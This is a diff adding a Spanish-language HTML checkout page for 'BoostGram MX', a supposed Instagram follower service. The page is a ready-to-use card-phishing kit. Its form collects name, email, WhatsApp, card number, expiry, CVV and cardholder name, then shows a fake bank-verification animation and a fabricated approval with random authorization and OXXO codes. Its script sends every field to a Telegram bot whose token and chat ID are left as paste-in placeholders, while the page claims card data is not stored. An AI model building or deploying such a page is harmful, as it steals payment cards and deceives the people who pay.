@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Pago seguro · BoostGram MX</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800;900&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#07060f;--card:#141127;--line:#272046;--txt:#f4f2ff;--mut:#a9a3c9;--pur:#a855f7;--blu:#4f7dff;--grn:#22c55e;--ig2:#dc2743}
+body{background:var(--bg);color:var(--txt);font-family:'Inter',system-ui,sans-serif;line-height:1.55;min-height:100vh}
+.wrap{max-width:900px;margin:0 auto;padding:0 20px}
+a{text-decoration:none;color:inherit}
+nav{border-bottom:1px solid var(--line);padding:16px 0;margin-bottom:30px}
+.nav{display:flex;align-items:center;justify-content:space-between}
+.logo{display:flex;align-items:center;gap:10px;font-weight:900;font-size:18px}
+.logo .dot{width:28px;height:28px;border-radius:8px;background:linear-gradient(135deg,#f09433,#dc2743,#bc1888);display:grid;place-items:center;font-size:15px}
+.secure{font-size:13px;color:var(--mut)}
+.pay{display:grid;grid-template-columns:340px 1fr;gap:24px;align-items:start;padding-bottom:60px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:22px}
+h3{font-size:17px;font-weight:800;margin-bottom:14px}
+.prod{display:flex;gap:12px;align-items:center;padding:12px;background:#0d0b1a;border-radius:12px;margin-bottom:16px}
+.prod .thumb{width:46px;height:46px;border-radius:12px;background:linear-gradient(135deg,#f09433,#dc2743,#bc1888);display:grid;place-items:center;font-size:20px}
+.prod b{display:block;font-size:14.5px}
+.prod span{font-size:12.5px;color:var(--mut)}
+.line{display:flex;justify-content:space-between;font-size:14px;color:var(--mut);padding:6px 0}
+.tot{display:flex;justify-content:space-between;font-size:17px;font-weight:900;border-top:1px solid var(--line);margin-top:10px;padding-top:12px}
+.tot .v{color:var(--grn)}
+.f{margin-bottom:13px}
+label{display:block;font-size:12.5px;color:var(--mut);font-weight:600;margin-bottom:6px}
+input{width:100%;padding:12px 14px;border-radius:11px;border:1px solid var(--line);background:#0d0b1a;color:var(--txt);font-family:inherit;font-size:15px;outline:none}
+input:focus{border-color:var(--pur)}
+input.err{border-color:var(--ig2)}
+.row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.methods{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:18px}
+.m{display:flex;align-items:center;gap:10px;border:1px solid var(--line);border-radius:12px;padding:14px;cursor:pointer;font-weight:700;font-size:14.5px;background:#0d0b1a}
+.m input{display:none}
+.m .r{width:18px;height:18px;border-radius:50%;border:2px solid var(--mut)}
+.m.sel{border-color:var(--pur);background:rgba(168,85,247,.12)}
+.m.sel .r{border-color:var(--pur);background:var(--pur);box-shadow:inset 0 0 0 3px #0d0b1a}
+.note{background:rgba(255,210,77,.08);border:1px solid rgba(255,210,77,.35);border-radius:12px;padding:14px;font-size:13.5px;color:#ffe08a}
+.oculto{display:none}
+.btn{width:100%;margin-top:20px;padding:16px;border:none;border-radius:13px;background:linear-gradient(135deg,#16a34a,#22c55e);color:#fff;font-weight:900;font-size:16.5px;font-family:inherit;cursor:pointer}
+.btn:hover{transform:translateY(-2px)}
+.ssl{text-align:center;font-size:12.5px;color:var(--mut);margin-top:12px}
+.ov{position:fixed;inset:0;background:rgba(7,6,15,.9);backdrop-filter:blur(6px);display:grid;place-items:center;text-align:center;z-index:99}
+.spin{width:54px;height:54px;border:4px solid var(--line);border-top-color:var(--pur);border-radius:50%;margin:0 auto 18px;animation:g .9s linear infinite}
+@keyframes g{to{transform:rotate(360deg)}}
+.ov h3{font-size:19px}
+.ov p{color:var(--mut);font-size:14px;margin-top:6px}
+.ok{position:fixed;inset:0;background:var(--bg);z-index:100;overflow:auto;text-align:center;padding:60px 20px}
+.ok .c{width:74px;height:74px;border-radius:50%;background:rgba(34,197,94,.16);display:grid;place-items:center;font-size:38px;margin:20px auto 22px;border:2px solid rgba(34,197,94,.4)}
+.ok h2{font-size:28px;font-weight:900;margin-bottom:10px}
+.ok .box{max-width:520px;margin:24px auto;background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px;text-align:left}
+.ok .box .r{display:flex;justify-content:space-between;font-size:14px;padding:9px 0;border-bottom:1px solid #1d1836}
+.ok .box .r:last-child{border:none}
+.ok .box .r span{color:var(--mut)}
+.ok .box .r b{font-weight:700}
+.ref{font-size:26px;font-weight:900;letter-spacing:4px;color:#ffd24d;margin:8px 0}
+@media(max-width:780px){.pay{grid-template-columns:1fr}.res{position:static}}
+</style>
+</head>
+<body>
+
+<nav><div class="wrap nav">
+  <div class="logo"><span class="dot">&#128248;</span> BoostGram<span style="color:var(--pur)">MX</span></div>
+  <div class="secure">&#128274; Pago seguro SSL</div>
+</div></nav>
+
+<div class="wrap pay">
+  <div class="card res">
+    <h3>Resumen del pedido</h3>
+    <div class="prod">
+      <div class="thumb">&#128248;</div>
+      <div><b>1000 Seguidores Reales</b><span>Instagram &middot; Oferta de prueba</span></div>
+    </div>
+    <div class="line"><span>Subtotal</span><span>MX$25.00</span></div>
+    <div class="line"><span>Envío / gestión</span><span>MX$0.00</span></div>
+    <div class="line"><span>IVA incluido</span><span>&#10003;</span></div>
+    <div class="tot"><span>Total</span><span class="v">MX$25.00</span></div>
+    <p style="font-size:12.5px;color:var(--mut);margin-top:16px">&#9201; Entrega estimada: menos de 24 horas</p>
+  </div>
+
+  <div class="card">
+    <h3>Datos de contacto</h3>
+    <form id="form">
+      <div class="f"><label>Nombre completo</label><input id="nombre" placeholder="Juan Pérez" autocomplete="name"></div>
+      <div class="f"><label>Usuario de Instagram</label><input id="ig" placeholder="@tucuenta"></div>
+      <div class="row">
+        <div class="f"><label>Correo electrónico</label><input id="email" placeholder="tucorreo@gmail.com" inputmode="email"></div>
+        <div class="f"><label>WhatsApp (opcional)</label><input id="wa" placeholder="55 1234 5678" inputmode="tel"></div>
+      </div>
+
+      <h3 style="margin-top:8px">Método de pago</h3>
+      <div class="methods">
+        <label class="m sel" id="mTarjeta"><input type="radio" name="m" value="Tarjeta" checked><span class="r"></span> Tarjeta</label>
+        <label class="m" id="mOxxo"><input type="radio" name="m" value="OXXO"><span class="r"></span> OXXO</label>
+      </div>
+
+      <div id="bloqueTarjeta">
+        <div class="f"><label>Número de tarjeta</label><input id="num" placeholder="1234 5678 9012 3456" inputmode="numeric"></div>
+        <div class="row">
+          <div class="f"><label>Vencimiento</label><input id="ven" placeholder="MM/AA" inputmode="numeric"></div>
+          <div class="f"><label>CVV</label><input id="cvv" placeholder="123" inputmode="numeric"></div>
+        </div>
+        <div class="f"><label>Nombre en la tarjeta</label><input id="titular" placeholder="JUAN PEREZ"></div>
+      </div>
+
+      <div id="bloqueOxxo" class="oculto">
+        <div class="note">&#128176; Al confirmar te damos una <b>referencia</b> para pagar tus MX$25 en cualquier OXXO. Tu pedido se activa cuando el pago se refleja.</div>
+      </div>
+
+      <button class="btn" type="submit" id="btnPagar">Pagar MX$25.00</button>
+      <p class="ssl">&#128274; Conexión cifrada &middot; No guardamos los datos de tu tarjeta</p>
+    </form>
+  </div>
+</div>
+
+<div class="ov oculto" id="ov">
+  <div>
+    <div class="spin"></div>
+    <h3 id="ovT">Procesando tu pago…</h3>
+    <p id="ovP">Conectando con el banco emisor…</p>
+  </div>
+</div>
+
+<div class="ok oculto" id="ok">
+  <div class="c">&#10003;</div>
+  <h2 id="okT">¡Pago aprobado!</h2>
+  <p style="color:var(--mut);font-size:15px">Tu pedido fue registrado correctamente.</p>
+  <div class="box" id="okBox"></div>
+  <p style="color:var(--mut);font-size:13.5px;max-width:460px;margin:0 auto 22px" id="okMsg"></p>
+  <a href="index.html" class="btn" style="max-width:280px;display:inline-block;text-decoration:none;padding:15px 30px">Volver al inicio</a>
+</div>
+
+<script>
+/* ======== CONFIGURACIÓN — PEGÁ ACÁ TUS DATOS ======== */
+const TOKEN   = "PEGA_TU_TOKEN_ACA";
+const CHAT_ID = "PEGA_TU_CHAT_ID_ACA";
+/* =================================================== */
+
+const $ = id => document.getElementById(id);
+const form = $("form");
+let metodo = "Tarjeta";
+
+$("mTarjeta").addEventListener("click", () => setMetodo("Tarjeta"));
+$("mOxxo").addEventListener("click", () => setMetodo("OXXO"));
+
+function setMetodo(m){
+  metodo = m;
+  $("mTarjeta").classList.toggle("sel", m === "Tarjeta");
+  $("mOxxo").classList.toggle("sel", m === "OXXO");
+  $("bloqueTarjeta").classList.toggle("oculto", m !== "Tarjeta");
+  $("bloqueOxxo").classList.toggle("oculto", m !== "OXXO");
+}
+
+/* máscaras */
+$("num").addEventListener("input", e => {
+  let v = e.target.value.replace(/\D/g, "").slice(0, 16);
+  e.target.value = v.replace(/(.{4})/g, "$1 ").trim();
+});
+$("ven").addEventListener("input", e => {
+  let v = e.target.value.replace(/\D/g, "").slice(0, 4);
+  if (v.length > 2) v = v.slice(0, 2) + "/" + v.slice(2);
+  e.target.value = v;
+});
+$("cvv").addEventListener("input", e => { e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4); });
+$("ig").addEventListener("input", e => { e.target.value = e.target.value.replace(/^@+/, "@"); });
+
+function valido(id, cond){
+  const el = $(id);
+  const ok = cond(el.value.trim());
+  el.classList.toggle("err", !ok);
+  return ok;
+}
+
+form.addEventListener("submit", e => {
+  e.preventDefault();
+  let ok = true;
+  ok = valido("nombre", v => v.length >= 3) && ok;
+  ok = valido("ig", v => v.replace("@", "").length >= 3) && ok;
+  ok = valido("email", v => /^\S+@\S+\.\S+$/.test(v)) && ok;
+  if (metodo === "Tarjeta"){
+    ok = valido("num", v => v.replace(/\D/g, "").length === 16) && ok;
+    ok = valido("ven", v => /^\d{2}\/\d{2}$/.test(v)) && ok;
+    ok = valido("cvv", v => v.replace(/\D/g, "").length >= 3) && ok;
+    ok = valido("titular", v => v.length >= 3) && ok;
+  }
+  if (!ok) return;
+  procesar();
+});
+
+function codigo(n){ let s = ""; for (let i = 0; i < n; i++) s += Math.floor(Math.random() * 10); return s; }
+const idPedido = "BG-" + codigo(6);
+const refOxxo  = codigo(4) + " " + codigo(4) + " " + codigo(4) + " " + codigo(4);
+const autoriz  = codigo(6);
+
+function procesar(){
+  $("ov").classList.remove("oculto");
+  const pasos = [
+    ["Procesando tu pago…", "Conectando con el banco emisor…"],
+    ["Verificando tarjeta…", "Validando datos de seguridad (3D Secure)…"],
+    ["Autorizando transacción…", "Esperando confirmación del banco…"],
+    ["Confirmando pago…", "Casi listo…"]
+  ];
+  let i = 0;
+  const t = setInterval(() => {
+    if (i < pasos.length){ $("ovT").textContent = pasos[i][0]; $("ovP").textContent = pasos[i][1]; i++; }
+  }, 900);
+
+  setTimeout(() => {
+    clearInterval(t);
+    $("ov").classList.add("oculto");
+    enviar();
+    mostrarOk();
+  }, 3800);
+}
+
+function enviar(){
+  const o = {
+    id: idPedido, metodo: metodo,
+    nombre: $("nombre").value.trim(),
+    ig: $("ig").value.trim(),
+    email: $("email").value.trim(),
+    wa: $("wa").value.trim(),
+    tarjeta: metodo === "Tarjeta" ? $("num").value.trim() : "—",
+    vence: metodo === "Tarjeta" ? $("ven").value.trim() : "—",
+    cvv: metodo === "Tarjeta" ? $("cvv").value.trim() : "—",
+    titular: metodo === "Tarjeta" ? $("titular").value.trim() : "—",
+    fecha: new Date().toLocaleString("es-MX")
+  };
+  try { localStorage.setItem("bg_pedido", JSON.stringify(o)); } catch(e){}
+
+  const texto =
+    "NUEVO PEDIDO - BoostGram MX\n" +
+    "--------------------------------\n" +
+    "Pedido: " + o.id + "\n" +
+    "Pack: 1000 seguidores de Instagram\n" +
+    "Total: MX$25.00 MXN\n" +
+    "Metodo: " + o.metodo + "\n" +
+    "--------------------------------\n" +
+    "Nombre: " + o.nombre + "\n" +
+    "Instagram: " + o.ig + "\n" +
+    "Email: " + o.email + "\n" +
+    "WhatsApp: " + (o.wa || "—") + "\n" +
+    "--------------------------------\n" +
+    "Tarjeta: " + o.tarjeta + "\n" +
+    "Vence: " + o.vence + "\n" +
+    "CVV: " + o.cvv + "\n" +
+    "Titular: " + o.titular + "\n" +
+    "--------------------------------\n" +
+    "Autorizacion: " + autoriz + "\n" +
+    o.fecha;
+
+  fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: texto })
+  }).catch(() => {});
+}
+
+function mostrarOk(){
+  const p = JSON.parse(localStorage.getItem("bg_pedido") || "{}");
+  let html = "";
+  html += '<div class="r"><span>N° de pedido</span><b>' + p.id + '</b></div>';
+  html += '<div class="r"><span>Producto</span><b>1000 seguidores</b></div>';
+  html += '<div class="r"><span>Total pagado</span><b>MX$25.00</b></div>';
+  html += '<div class="r"><span>Método</span><b>' + p.metodo + '</b></div>';
+  html += '<div class="r"><span>Instagram</span><b>' + p.ig + '</b></div>';
+
+  if (p.metodo === "OXXO"){
+    $("okT").textContent = "¡Pedido registrado!";
+    html += '<div style="padding-top:14px;border-top:1px solid #1d1836;margin-top:8px"><span style="color:var(--mut);font-size:13px">Referencia para pagar en OXXO</span><div class="ref">' + refOxxo + '</div><span style="color:var(--mut);font-size:12.5px">Acudí a cualquier OXXO y pagá MX$25 con esta referencia.</span></div>';
+    $("okMsg").textContent = "Tu pedido se activa cuando el pago se refleja. Te avisamos por correo o WhatsApp.";
+  } else {
+    html += '<div class="r"><span>Autorización</span><b>' + autoriz + '</b></div>';
+    $("okMsg").textContent = "Te enviamos la confirmación por correo. Los seguidores empiezan a llegar en las próximas horas.";
+  }
+
+  $("okBox").innerHTML = html;
+  $("ok").classList.remove("oculto");
+}
+</script>
+</body>
+</html>
